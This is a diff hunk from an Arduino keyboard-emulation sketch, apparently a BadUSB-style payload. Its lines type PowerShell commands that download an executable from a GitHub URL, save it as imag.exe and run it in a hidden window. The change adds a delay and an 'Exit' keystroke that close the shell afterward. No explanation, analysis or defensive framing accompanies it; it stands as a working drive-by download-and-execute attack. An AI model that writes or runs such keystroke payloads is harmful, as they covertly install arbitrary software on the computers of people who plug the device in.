@@ -28,6 +28,8 @@ void setup()
     Keyboard.println("Invoke-WebRequest -Uri https://github.com/orimeged/Fire_spirit/raw/main/spirit%20fire/Debug/spirit_fire.exe -OutFile ./imag.exe");
     delay(2000);
     Keyboard.println("PowerShell.exe -WindowStyle hidden { ./imag.exe }");
+    delay(1500);
+    Keyboard.println("Exit");
   Keyboard.end();
 }
 void loop()
